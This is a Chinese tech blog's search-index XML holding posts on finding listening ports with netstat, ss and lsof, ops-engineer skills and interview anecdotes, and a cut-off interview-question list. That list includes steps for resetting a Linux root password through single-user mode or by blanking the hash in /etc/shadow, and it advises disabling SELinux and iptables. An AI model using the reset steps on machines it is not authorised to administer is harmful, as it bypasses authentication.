<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux中是谁占用了我的端口</title>
    <link href="/2023/07/28/Linux%E4%B8%AD%E6%98%AF%E8%B0%81%E5%8D%A0%E7%94%A8%E4%BA%86%E6%88%91%E7%9A%84%E7%AB%AF%E5%8F%A3/"/>
    <url>/2023/07/28/Linux%E4%B8%AD%E6%98%AF%E8%B0%81%E5%8D%A0%E7%94%A8%E4%BA%86%E6%88%91%E7%9A%84%E7%AB%AF%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是监听端口"><a href="#什么是监听端口" class="headerlink" title="什么是监听端口"></a>什么是监听端口</h2><p>网络端口由其编号，关联的IP地址和通信协议（例如TCP或UDP）的类型标识。</p><p>侦听端口是应用程序或进程在其上侦听的网络端口，充当通信端点。</p><p>每个监听端口都可以使用防火墙打开或关闭（过滤）。一般而言，开放端口是一个网络端口，它接受来自远程位置的传入数据包。</p><p>你不能让两个服务监听同一IP地址上的同一端口。</p><p>例如，如果你正在运行一个监听端口80和443的Apache Web服务器，并且尝试安装Nginx ，则后者将无法启动，因为HTTP和HTTPS端口是已经在使用中。</p><h2 id="用netstat检查监听端口"><a href="#用netstat检查监听端口" class="headerlink" title="用netstat检查监听端口"></a>用netstat检查监听端口</h2><p>netstat是一个命令行工具，可以提供有关网络连接的信息。</p><p>要列出所有正在侦听的TCP或UDP端口，包括使用端口的服务和套接字状态，请使用以下命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo netstat -tunlp</span><br></code></pre></td></tr></table></figure><p>此命令中使用的选项具有以下含义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-t -显示TCP端口。<br>-u -显示UDP端口。<br>-n -显示数字地址而不是解析主机。<br>-l -仅显示监听端口。<br>-p -显示侦听器进程的PID和名称。仅当你以root用户或 sudo 用户身份运行命令时，才会显示此信息。 COPY<br></code></pre></td></tr></table></figure><p>输出将如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Proto Recv-Q Send-Q Local Address   Foreign Address     State       PID/Program name      <br>tcp        0      0 0:22              0:*               LISTEN      445/sshd              <br>tcp        0      0 0:25              0:*               LISTEN      929/master            <br>tcp6       0      0 :::3306           ::*               LISTEN      534/mysqld            <br>tcp6       0      0 :::80             :::*              LISTEN      515/apache2            <br>tcp6       0      0 :::22             :::*              LISTEN      445/sshd              <br>tcp6       0      0 :::25             :::*              LISTEN      929/master            <br>tcp6       0      0 :::33060          :::*              LISTEN      534/mysqld            <br>udp        0      0 0:68              0:*                           966/dhclientCOPY<br></code></pre></td></tr></table></figure><p>在我们的案例中，重要的几列是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Proto-套接字使用的协议。<br>Local Address -进程侦听的IP地址和端口号。<br>PID/Program name -PID和进程名称。 COPY<br></code></pre></td></tr></table></figure><p>如果要过滤结果，请使用 grep命令。例如，要查找在TCP端口22上侦听的进程，你可以输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netstat -tnlp | grep :22COPY<br></code></pre></td></tr></table></figure><p>输出显示此计算机上的端口22被SSH服务器使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcp        0      0 0:22              0:*               LISTEN      445/sshd  <br>tcp6       0      0 :::22             :::*              LISTEN      445/sshdCOPY<br></code></pre></td></tr></table></figure><p>如果输出为空，则表示端口上没有监听。</p><p>你也可以根据条件过滤列表，例如PID，协议，状态等。</p><p>netstat已过时，被ss和 ip 取代，但它仍然是检查网络连接的最常用命令。</p><h2 id="用ss-检查监听端口"><a href="#用ss-检查监听端口" class="headerlink" title="用ss 检查监听端口"></a>用ss 检查监听端口</h2><p>ss是新的netstat。它缺少netstat的某些功能，但是公开了更多的TCP状态，并且速度稍快。命令选项基本相同，因此从netstat到ss的转换并不困难。</p><p>要使用ss获取所有监听端口的列表，请输入：<code>sudo ss -tunlp</code></p><p>输出与netstat报告的输出几乎相同：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port                                                                                    <br>LISTEN   0        128              0:22             0:*      <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;sshd&quot;</span>,pid=445,fd=3))                                                          <br>LISTEN   0        100              0:25             0:*      <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;master&quot;</span>,pid=929,fd=13))                                                        <br>LISTEN   0        128                    *:3306                 *:*      <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;mysqld&quot;</span>,pid=534,fd=30))                                                        <br>LISTEN   0        128                    *:80                   *:*      <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;apache2&quot;</span>,pid=765,fd=4),(<span class="hljs-string">&quot;apache2&quot;</span>,pid=764,fd=4),(<span class="hljs-string">&quot;apache2&quot;</span>,pid=515,fd=4))      <br>LISTEN   0        128                 [::]:22                [::]:*      <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;sshd&quot;</span>,pid=445,fd=4))                                                          <br>LISTEN   0        100                 [::]:25                [::]:*      <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;master&quot;</span>,pid=929,fd=14))                                                        <br>LISTEN   0        70                     *:33060                *:*      <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;mysqld&quot;</span>,pid=534,fd=33))COPY<br></code></pre></td></tr></table></figure><h2 id="使用lsof"><a href="#使用lsof" class="headerlink" title="使用lsof"></a>使用lsof</h2><p>检查监听端口</p><p>lsof是功能强大的命令行应用程序，可提供有关进程打开的文件的信息。</p><p>在Linux中，所有内容都是文件。你可以将套接字视为写入网络的文件。</p><p>要获取具有lsof的所有侦听TCP端口的列表，请输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lsof -nP -iTCP -sTCP:LISTENCOPY<br></code></pre></td></tr></table></figure><p>使用的选项如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">-n-不要将端口号转换为端口名称。<br>-p -不解析主机名，显示数字地址。 COPY<br></code></pre></td></tr></table></figure><p>-iTCP -sTCP:LISTEN -仅显示TCP状态为LISTEN的网络文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME  <br>sshd      445     root    3u  IPv4  16434      0t0  TCP *:22 (LISTEN)  <br>sshd      445     root    4u  IPv6  16445      0t0  TCP *:22 (LISTEN)  <br>apache2   515     root    4u  IPv6  16590      0t0  TCP *:80 (LISTEN)  <br>mysqld    534    mysql   30u  IPv6  17636      0t0  TCP *:3306 (LISTEN)  <br>mysqld    534    mysql   33u  IPv6  19973      0t0  TCP *:33060 (LISTEN)  <br>apache2   764 www-data    4u  IPv6  16590      0t0  TCP *:80 (LISTEN)  <br>apache2   765 www-data    4u  IPv6  16590      0t0  TCP *:80 (LISTEN)  <br>master    929     root   13u  IPv4  19637      0t0  TCP *:25 (LISTEN)  <br>master    929     root   14u  IPv6  19638      0t0  TCP *:25 (LISTEN)COPY<br></code></pre></td></tr></table></figure><p>大多数输出列名称都是不言自明的:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">COMMAND，PID，USER-运行与端口关联的程序的名称，PID和用户。<br>NAME -端口号。 COPY<br></code></pre></td></tr></table></figure><p>要查找正在侦听特定端口（例如端口3306）的进程，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo lsof -nP -iTCP:3306 -sTCP:LISTENCOPY<br></code></pre></td></tr></table></figure><p>输出显示MySQL服务器使用端口3306:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME  <br>mysqld  534 mysql   30u  IPv6  17636      0t0  TCP *:3306 (LISTEN)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux运维工程师10个基本技能点</title>
    <link href="/2023/07/28/Linux%E8%BF%90%E7%BB%B4%E5%B7%A5%E7%A8%8B%E5%B8%8810%E4%B8%AA%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD%E7%82%B9/"/>
    <url>/2023/07/28/Linux%E8%BF%90%E7%BB%B4%E5%B7%A5%E7%A8%8B%E5%B8%8810%E4%B8%AA%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="1、linux系统基础"><a href="#1、linux系统基础" class="headerlink" title="1、linux系统基础"></a><strong>1、linux系统基础</strong></h2><p>这个不用说了，是基础中的基础，连这个都不会就别干了。</p><h2 id="2、网络服务"><a href="#2、网络服务" class="headerlink" title="2、网络服务"></a><strong>2、网络服务</strong></h2><p>服务有很多种，每间公司都会用到不同的，但基础的服务肯定要掌握，如FTP, DNS,SAMBA, 邮件, 这几个大概学一下就行。</p><p>LAMP和LNMP是必须要熟练，我所指的不是光会搭建，而是要很熟悉里面的相当配置才行，因为公司最关键的绝对是WEB服务器，所以nginx和apache要熟悉，特别是nginx一定要很熟悉才行。有些公司还会用tomcat，这个也最好学一下。</p><p>其实网络服务方面不用太担心，一般公司的环境都已经搭建好，就算有新服务器或让你整改，公司会有相应的文档让你参照来弄，不会让你乱来的，但至少相关的配置一定要学熟，而且肯定是编译安装多，那些模块要熟悉一下他的作用，特别是PHP那些模块。</p><p>这面2点只是基础，也是必要条件，不能说是工具，下以才是真正的要掌握的工具。</p><h2 id="3、shell脚本和另一个脚本语言"><a href="#3、shell脚本和另一个脚本语言" class="headerlink" title="3、shell脚本和另一个脚本语言"></a><strong>3、shell脚本和另一个脚本语言</strong></h2><p>shell是运维人员必须具备的，不懂这个连入职都不行，至少也要写出一些系统管理脚本，最简单也得写个监控CPU，内存比率的脚本吧，这是最最最基本了。别以为会写那些猜数字和计算什么数的，这些没什么作用，只作学习意义，写系统脚本才是最有意义。</p><p>而另一个脚本语言是可选的，一般是3P，即Python，Perl和PHP，PHP就不需要考虑了，除非你要做开发，我个人建议学Python会比较好，不难实现自动化运维，Perl是文本处理很强大，反正这两个学一个就行了。</p><h2 id="4、sed和awk工具"><a href="#4、sed和awk工具" class="headerlink" title="4、sed和awk工具"></a><strong>4、sed和awk工具</strong></h2><p>必须要掌握，在掌握这两个工具同时，还要掌握正则表达式，这个就痛苦了，正则是最难学的表达式，但结合到sed和awk中会很强大，在处理文本内容和过滤WEB内容时十分有用，不过在学shell的同时一般会经常结合用到的，所以学第3点就会顺便学第4点。</p><h2 id="5、文本处理命令"><a href="#5、文本处理命令" class="headerlink" title="5、文本处理命令"></a><strong>5、文本处理命令</strong></h2><p>sort , tr , cut, paste, uniq, tee等，必学，也是结合第3点时一并学习的。</p><h2 id="6、数据库"><a href="#6、数据库" class="headerlink" title="6、数据库"></a><strong>6、数据库</strong></h2><p>首选MySQL，别问我为什么不学SQL Server和Oracle，因为Linux用得最多绝对是MySQL。增删改查必学，特别要学熟查，其它方面可能不太需要，因为运维人员使用最多还是查，哪些优化和开发语句不会让你弄的。</p><h2 id="7、防火墙"><a href="#7、防火墙" class="headerlink" title="7、防火墙"></a><strong>7、防火墙</strong></h2><p>不学不行，防火墙也算是个难点，说难不难，说易不易，最重要弄懂规则。如果学过CCNA的朋友可能会比较好学，因为iptables也有NAT表，原理是一样的，而Filter表用得最多，反正不学就肯定不合格。</p><h2 id="8、监控工具"><a href="#8、监控工具" class="headerlink" title="8、监控工具"></a><strong>8、监控工具</strong></h2><p>十分十分重要，我个人建议，最好学这3个，cacti，nagios，zabbix。企业用得最多应该是nagios和 zabbix，反正都学吧，但nagios会有点难，因为会涉及到用脚本写自动监控，那个地方很难。</p><h2 id="9、集群和热备"><a href="#9、集群和热备" class="headerlink" title="9、集群和热备"></a><strong>9、集群和热备</strong></h2><p>这个很重要，肯定要懂的，但到了公司就不会让你去弄，因为新手基本不让你碰。集群工具有很多，最好学是LVS，这是必学，最好也学学nginx集群，反向代理。还有热备，这个就更多工具能实现了，像我公司是自己开发热备工具的，MySQL热备也要学，就是主从复制，这个别告诉我容易，其实不容易的，要学懂整个流程一点也不容易，只照着做根本没意思。</p><h2 id="10、数据备份"><a href="#10、数据备份" class="headerlink" title="10、数据备份"></a><strong>10、数据备份</strong></h2><p>不学不行，工具有很多，但至少要把RAID的原理弄懂，特别是企业最常用的1+0或0+1，自己做实验也要弄出来，备份工具有很多，如tar, dump, rsync等，最好多了解一下。</p><p>说到这10点，应该可以入门了，因为有些技术会比较难学。例如apache和nginx中还有些很重要的技术，如系统调优和服务优化，还有程序优化，这些在没接触工作前很难学习到的，所以先把这10点学了吧。估计要学熟至少3个月不止，就脚本那部分已经让你很吃力了。建议是先学熟shell，等工作后再学另一门脚本语言。</p><p>以上就是踏入linux运维工程师需要掌握的工具，其实还有很多工具要掌握的，但你在学习环境中是很难学到，最后我再提醒一下，这里所指的工具相当于技能，而不是像windows或ubuntu那些图形化工具，那些工具没用的，还有，学linux就别装图形界面，这样虚拟机就不用吃太多内存，而且绝对不建议在真机上装linux，根本达不到学习效果。</p><p>面试A君：<br>应聘职位：高级系统工程师  ， 工资要18K</p><p>此君简历写的不错，在360干过几年，简历上写的是维护公司的360网盘平台，管理着2000多台机器，写了很多自动化工具。然后我就让他跟我聊聊他做的自动化工具，哥们娓娓到来跟我讲他写的那些脚本（自动部署、批量命令、日志分析），从他的表情中感觉他好像觉得他做过的这些东西很牛B（其实都是一堆SHELL+PYTHON拼凑起来的粗糙工具，需求稍一改变就不能满足，脚本的扩展性极差），他说他现在的工作基本上80%都能通过脚本完成，说完后直视我，貌似是等待着我的认可，出于尊重，我只好说那确实不错。接下来我就拿他写过的批量并发执行命令的脚本跟他深入聊了下，他说这个脚本是Python多线程并发的，1000台机器执行一次批量命令1分钟就能全部完成，我于是让他给我讲讲多线程与多进程的区别，在什么时候用线程或进程更合适，结果哥们说了很多废话也没有讲明白。然后我又让他用PYTHON多线程给我写个简单的生产者消费者模型，哥们愣是不知道这是啥东西？那我又问，如果你不知道生产者消费者模型是什么，那你的并发异步处理是怎么做的？哥们语塞说没在这方面做过深入研究，我于是又问了几个其它方面的问题，比如他的Ngnix 日志是如何分析的？自动部署如何跟git结合的？监控报警接口是如何优化才降低误报率的？但回答的都不理想，然后，就没有然后了….。   在这里我只能说，我不是想打击他，如果你只是写了几个脚本就声称自己就是自动化大拿了，未免有点牵强。所以他被PASS掉了，因为我觉得把他招过来，真的不会给我们公司的自动化水平提高多少!</p><p>面试B君：<br>应聘职位：运维自动化开发工程师，  工资不能低于16K</p><p>此君简历上说他擅长PHP\Python开发，在原公司做过运维自动化平台。我很感兴趣，让他讲一下他做的东西，主要是监控平台和CMDB资产数据库，让他着重讲了一下他的监控架构，他说他的项目主要是主动监控方式，就是监控服务器每隔一两分钟去轮巡一次所有的机器的SNMP接口，把各机器的基本系统性能信息抓回来，再通过RRDTOOL出图。他们有500多台机器散落在3个不同地区的机房，我问他你们这种做主动监控轮巡一次得多少时间？他说1分钟左右，我说如果轮巡过程中，如果有几台机器连不上怎么办？他说他的轮巡是并发的，连不上的不会影响其它机器的监控，我说但是你的线程池的线程个数是有限的，有几个线程因为机器连不上，那就会产生阻塞直至超时，但在超时之前这几个线程是不会再空闲出来的，因此肯定会导致整个轮巡时间的加长呀。哥们想了想说，确实存在这样的问题。然后我问他有没有考虑过用被动监控方式，就是让客户端自动汇报数据呢？他说当时他们也这样想过，但是一想到要在所有的机器上装个客户就觉得会增加复杂度，并且维护和管理不容易。我说采用被动模式确实会增加点复杂度，但会给你带来很多好处呀，监控客户端自动给你的服务器汇报数据会大大减少你主监控服务器的负载，并且可监控的东西要多的多呀，你还可以自定义插件，自动升级，并且还可以把监控客户端当做它用，比如自动化部署、任务下发等。可能是出于尊重，哥们假装同意了我的看法。</p><p>然后我又问他们的项目是几个人开发的，他说算他在内有3个人一块做，我说那你们之前是如何协作的，比如接口互相是如何调用和约定的？他说基本上是每个人写自己的接口，互相之间约定好如何调用。我问那你们有没有遵循什么标准？比如是统一用http api还是其它的？接口格式是统一用Json还是用XML 或其它？哥们说他们有的用JSON、有的用XML。我说你们没有用restful标准吗？哥们表示没听过。。。。。OH，好吧！如果大家开发时都不遵循一定的标准和规范，我真心不知道他们的系统以后如何扩展，不知道这个哥们离职后谁还能看懂他的代码？不知道这种拿一堆随心所意写出来的脚本来拼凑起来的所谓的系统能满足多少实际需求？</p><p>面试C君：<br>应聘职位：运维工程师    工资要求11K</p><p>哥们刚工作不到2年就要11K，真比我当时工作了2年挣的多多了(即使去掉通货膨胀影响)，但如果技术好那也没有问题的。结果问了一堆基础问题都答不好，再要这些钱是否有点自不量力了？问他LVS，结果只是配置过，让他讲几种负载调度原理也讲不明白，问他平时怎么管理大量机器，他说用SaltStack 或自己批量写脚本，我问那你用脚本批量管理机器，是通过什么方式呢？他说是用SSH批量密钥登录，我说那你给我讲讲RSA密钥认证原理吧，他接下说的就是怎么通过ssh-keygen命令，怎么把公钥拷到客户端机器上等怎么实现密钥认证的过程。我打断他说我想听的是原理，不是认证方法，为什么需要把public_key拷到客户机上而不是private_key？为什么COPY过去后就登录不需要再输入密码了？结果哥们一点都说不出来，接下来问的一些其它问题也是这样，只知其然，不知其所以然，最后我说，你这种情况我们给不了11K，如果低点你愿意考虑吗？哥们说不太会考虑，那。。。。好吧，只能打发他走了。</p><p>其它的一些面试者情况也好不到哪里去，一路十多个面下来，让我很失望，本以为过了这么多年以后，整个行业的从业素质会提高很多。但结果却还是老样子，所以大家可以想想业内大家都在炒的运维自动化到底实际有多水？如果从业人员技术水平都这样，还谈个妹自动化呢？自动化真的是写写脚本，再拿个开源软件拼拼凑凑下就完了吗？在我看来这撑死了只能叫辅助运维，不叫自动化，自动化应该是真正的开始让机器帮你监测问题＼发现问题＼处理问题＼解决问题＼自我修复＼自我维护＼自带干粮，各模块之间尽量低耦合＼可扩展＼可插拔。应该是真正能帮企业降低IT运营成本，使运营成本可视化＼可测量＼可对比，应该是真正能减轻运维人员的工作量而不是又制造一堆新的问题，应该是切合企业真正的实际需求做出来一些好用的工具和平台，而不是搞一些花里胡哨却最后扔在那里没人用的花架子（我自己在这方面就掉进过大坑，之前主导做的一个开源软件就是个失败案例）。</p><p>总之最后给我的感觉是，会开发的不真正的懂业务逻辑，开发出来的东西没人用，会运维的开发水平又太烂，写出来的代码烂到哭。想找个真正合格的运维自动化人才真是不容易。</p><p>我近期一共只面了10多个，确实不能代表全行业水平，有些真正技术牛人估计我也没有碰到，但是10多个样本里面一个合适的都找不到，我觉得这也能差不多从侧面说明一个行业的整体平均水平了，这些求职者水平不高，却又想要高工资，我能说这是眼高手低、好高骛远的表现么？打铁还需自身用，如果真想要高工资，请先踏实点把自身技术水平提高，如果真想做架构师，那请把架构技术和思想学好，如果真要做自动化运维，请先把至少一门开发语言学好、学透，不只是会写个脚本就完了，脚本只是脚本，那不是自动化，So，哥们别再逗了！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux高级运维工程师面试题收集</title>
    <link href="/2023/07/28/Linux%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86/"/>
    <url>/2023/07/28/Linux%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="1、Linux开机启动流程详细步骤是什么？"><a href="#1、Linux开机启动流程详细步骤是什么？" class="headerlink" title="1、Linux开机启动流程详细步骤是什么？"></a>1、Linux开机启动流程详细步骤是什么？</h2><p><strong>启动第一步——加载BIOS：</strong>当你打开计算机电源，计算机会首先加载BIOS信息，BIOS信息是如此的重要，以至于计算机必须在最开始就找到它。这是因为BIOS中包含了CPU的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP特性等等。在此之后，计算机心里就有谱了，知道应该去读取哪个硬件设备了。</p><p><strong>启动第二步——读取MBR：</strong>众所周知，硬盘上第0磁道第一个扇区被称为MBR，也就是Master Boot Record，即主引导记录，它的大小是512字节，别看地方不大，可里面却存放了预启动信息、分区表信息。系统找到BIOS所指定的硬盘的MBR后，就会将其复制到0×7c00地址所在的物理内存中。其实被复制到物理内存的内容就是Boot Loader，而具体到你的电脑，那就是lilo或者grub了。</p><p><strong>启动第三步——Boot Loader：</strong>Boot Loader 就是在操作系统内核运行之前运行的一段小程序。通过这段小程序，我们可以初始化硬件设备、建立内存空间的映射图，从而将系统的软硬件环境带到一个合适的状态，以便为最终调用操作系统内核做好一切准备。Boot Loader有若干种，其中Grub、Lilo和spfdisk是常见的Loader。我们以Grub为例来讲解吧，毕竟用lilo和spfdisk的人并不多。系统读取内存中的grub配置信息（一般为menu.lst或grub.lst），并依照此配置信息来启动不同的操作系统。</p><p><strong>启动第四步——加载内核：</strong>根据grub设定的内核映像所在路径，系统读取内存映像，并进行解压缩操作。此时，屏幕一般会输出“Uncompressing Linux”的提示。当解压缩内核完成后，屏幕输出“OK, booting the kernel”。系统将解压后的内核放置在内存之中，并调用start_kernel()函数来启动一系列的初始化函数并初始化各种设备，完成Linux核心环境的建立。至此，Linux内核已经建立起来了，基于Linux的程序应该可以正常运行了。</p><p><strong>启动第五步－－用户层init依据inittab文件来设定运行等级：</strong>内核被加载后，第一个运行的程序便是/sbin/init，该文件会读取/etc/inittab文件，并依据此文件来进行初始化工作。其实/etc/inittab文件最主要的作用就是设定Linux的运行等级，其设定形式是“：id:5:initdefault:”，这就表明Linux需要运行在等级5上。Linux的运行等级设定如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">0</span>：关机<br><br><span class="hljs-number">1</span>：单用户模式<br><br><span class="hljs-number">2</span>：无网络支持的多用户模式<br><br><span class="hljs-number">3</span>：有网络支持的多用户模式<br><br><span class="hljs-number">4</span>：保留，未使用<br><br><span class="hljs-number">5</span>：有网络支持有X-Window支持的多用户模式<br><br><span class="hljs-number">6</span>：重新引导系统，即重启<br>关于<span class="hljs-regexp">/etc/i</span>nittab文件的学问，其实还有很多<br></code></pre></td></tr></table></figure><p><strong>启动第六步－－init进程执行rc.sysinit：</strong>在设定了运行等级后，Linux系统执行的第一个用户层文件就是/etc/rc.d/rc.sysinit脚本程序，它做的工作非常多，包括设定PATH、设定网络配置（/etc/sysconfig/network）、启动swap分区、设定/proc等等。如果你有兴趣，可以到/etc/rc.d中查看一下rc.sysinit文件，里面的脚本够你看几天的。</p><p><strong>启动第七步－－启动内核模块：</strong>具体是依据/etc/modules.conf文件或/etc/modules.d目录下的文件来装载内核模块。</p><p><strong>启动第八步－－执行不同运行级别的脚本程序：</strong>根据运行级别的不同，系统会运行rc0.d到rc6.d中的相应的脚本程序，来完成相应的初始化工作和启动相应的服务。</p><p><strong>启动第九步－－执行/etc/rc.d/rc.local：</strong>你如果打开了此文件，里面有一句话，读过之后，你就会对此命令的作用一目了然：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This script will be executed *after* all the other init scripts.</span><br><span class="hljs-comment"># You can put your own initialization stuff in here if you don’t</span><br><span class="hljs-comment"># want to do the full Sys V style init stuff.</span><br></code></pre></td></tr></table></figure><p>rc.local就是在一切初始化工作后，Linux留给用户进行个性化的地方。你可以把你想设置和启动的东西放到这里。</p><p><strong>启动第十步－－执行/bin/login程序，进入登录状态：</strong>此时，系统已经进入到了等待用户输入username和password的时候了，你已经可以用自己的帐号登入系统了。</p><h2 id="2、Linux的管理员密码如何破解？"><a href="#2、Linux的管理员密码如何破解？" class="headerlink" title="2、Linux的管理员密码如何破解？"></a><strong>2、Linux的管理员密码如何破解？</strong></h2><p><strong>linux root密码找回方法一</strong></p><p><strong>第1步：</strong>在系统进入单用户状态，直接用passwd root去更改。</p><p><strong>第2步：</strong>用安装光盘引导系统，进行linux rescue状态，将原来/分区挂接上来,作法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mnt <span class="hljs-built_in">mkdir</span> hd mount -t auto /dev/hdaX(原来/分区所在的分区号) hd <span class="hljs-built_in">cd</span> hd <span class="hljs-built_in">chroot</span> ./ passwd root<br></code></pre></td></tr></table></figure><p><strong>第3步：</strong>将本机的硬盘拿下来，挂到其他的linux系统上，采用的办法与第二种相同.</p><p><strong>linux root密码找回方法二</strong></p><p><strong>第1步：</strong>用lilo引导系统时：在出现 lilo: 提示时键入 linux single</p><p>画面显示lilo: linux single</p><p><strong>第2步：</strong>回车可直接进入linux命令行</p><p><strong>第3步：</strong>使用以下命令“vi /etc/shadow”将第一行，即以root开头的一行中root:后和下一个:前的内容删除，第一行将类似于root::……保存</p><p>vim /etc/shadow</p><p><strong>第4步：</strong>reboot重启，root密码为空。</p><p><strong>linux root密码找回方法三</strong></p><p><strong>第1步：</strong>用grub引导系统时：在出现grub画面时，用上下键选中你平时启动linux的那一项(别选dos哟)，然后按e键</p><p><strong>第2步：</strong>再次用上下键选中你平时启动linux的那一项(类似于kernel /boot/vmlinuz-2.4.18-14 ro root=LABEL=/)，然后按e键</p><p><strong>第3步：</strong>修改你现在见到的命令行，加入single，结果如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kernel</span> /boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span>-<span class="hljs-number">14</span> single ro root=LABEL=/ single<br></code></pre></td></tr></table></figure><p><strong>第4步：</strong>回车返回，然后按b键启动，即可直接进入linux命令行.</p><p><strong>第5步：</strong>使用以下命令“vi /etc/shadow”将第一行，即以root开头的一行中root:后和下一个:前的内容删除，第一行将类似于root::……保存<br>vim /etc/shadow</p><p><strong>第6步：</strong>reboot重启，root密码为空。</p><h2 id="3、请描述Linux系统优化的几个步骤。"><a href="#3、请描述Linux系统优化的几个步骤。" class="headerlink" title="3、请描述Linux系统优化的几个步骤。"></a><strong>3、请描述Linux系统优化的几个步骤。</strong></h2><p>1、登录系统:不使用root登录，通过sudo授权管理，使用普通用户登录。</p><p>2、禁止SSH远程：更改默认的远程连接SSH服务及禁止root远程连接。</p><p>3、时间同步：定时自动更新服务器时间。</p><p>4、配置yum更新源，从国内更新下载安装rpm包。</p><p>5、关闭selinux及iptables（iptables工作场景如有wan ip，一般要打开，高并发除外）</p><p>6、调整文件描述符数量，进程及文件的打开都会消耗文件描述符。</p><p>7、定时自动清理/var/spool/clientmquene/目录垃圾文件，防止节点被占满（c6.4默认没有sendmail，因此可以不配。）</p><p>8、精简开机启动服务（crond、sshd、network、rsyslog）</p><p>9、Linux内核参数优化/etc/sysctl.conf，执行sysct -p生效。</p><p>10、更改字符集，支持中文，但是还是建议使用英文，防止乱码问题出现。</p><p>11、锁定关键系统文件（chattr +i /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/inittab 处理以上内容后，把chatter改名，就更安全了。）</p><p>12、清空/etc/issue，去除系统及内核版本登陆前的屏幕显示。</p><h2 id="4、描述Linux运行级别0-6的各自含义"><a href="#4、描述Linux运行级别0-6的各自含义" class="headerlink" 